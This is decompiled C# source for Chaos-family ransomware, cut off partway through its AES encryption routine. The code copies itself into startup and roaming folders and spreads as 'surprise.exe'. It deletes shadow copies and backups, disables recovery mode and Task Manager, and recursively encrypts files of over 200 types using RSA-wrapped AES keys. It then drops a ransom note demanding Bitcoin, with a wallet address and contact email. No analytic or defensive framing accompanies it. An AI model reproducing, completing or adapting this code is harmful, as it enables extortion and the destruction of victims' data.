using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "59spkwhx7eyc6p3lmaf472";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "Home.exe";

	public static string appMutexRun2 = "L1v1y5gq751piPGGHNs";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qn5cmjkju03h49ml6";

	private static string droppedMessageTextbox = "View_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	public static string appMutexStartup2 = "1Cee1QKq46myiLV";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "blacksheep from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "", "You can purchase bitcoin via ", "bitcoin.com, moonpay.com or do your rearsh on what workks for you", "",
		"send proof of payment to : 007wizard.black@gmail.com", "", "Payment informationAmount: 0.1473766 BTC", "Bitcoin Address:  bc1qf37trsw3d0hc5ujvfphsgfs2tv6lwkzjvq094z", ""
	};

	private static string[] validExtensions = new string[232]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".ova",
		".sin", ".exe"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (isOver())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					string text = CreatePassword(40);
					if (fileInfo.Length < 1368709120L)
					{
						string keyRSA = RSA_Encrypt(text, rsaKey());
						if (checkDirContains(files[i]) && checkFileName(fileInfo.Name))
						{
							AES_Encrypt(files[i], text, keyRSA);
						}
					}
					else
					{
						AES_Encrypt_Large(files[i], text, fileInfo.Length);
					}
					if (flag)
					{
						flag = false;
						string path = location + "/" + droppedMessageTextbox;
						string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
						if (!File.Exists(path) && location != folderPath)
						{
							File.WriteAllLines(path, messages);
						}
					}
				}
				catch (Exception)
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	private static bool checkFileName(string fileName)
	{
		string[] array = new string[12]
		{
			"boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log", "ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak",
			"bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		int num = 0;
		while (true)
		{
			if (num < array2.Length)
			{
				string text = array2[num];
				if (text == fileName)
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[3] { "appdata\\local", "appdata\\locallow", "users\\all users" };
		string[] array2 = array;
		int num = 0;
		while (true)
		{
			if (num < array2.Length)
			{
				string value = array2[num];
				if (directory.Contains(value))
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>sjItboz6KZa2P4rhmwvZXikLhrmInjjTyN0GI1BXnXsqUpm5oI+EttgqVVY61Grmk6veIU+f64m0XFA+DziSCKSHLs3qYV5Ey1LyCdBVbKfyPDYXfkiVwtAw649JhqFAb/L00/BaBPlHDFRPG1qszyR/MQBBe10Ap8JxWZh/MtcRJHfan21YGdAWH9b2qxHOoyWTTIokhI/ToAr0CfwQTBV/7okdYI+exguqrGNiTs612VL/Hxo1zuHCQJQnerkwDShgmUx/9BiiC3dfXcms7mQDTcx0cIqmE4NQC/dCLY5MJ9gZf3WvhfEQ2z/BuREGeFfWIKy+SFFhNeV7BAntmQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
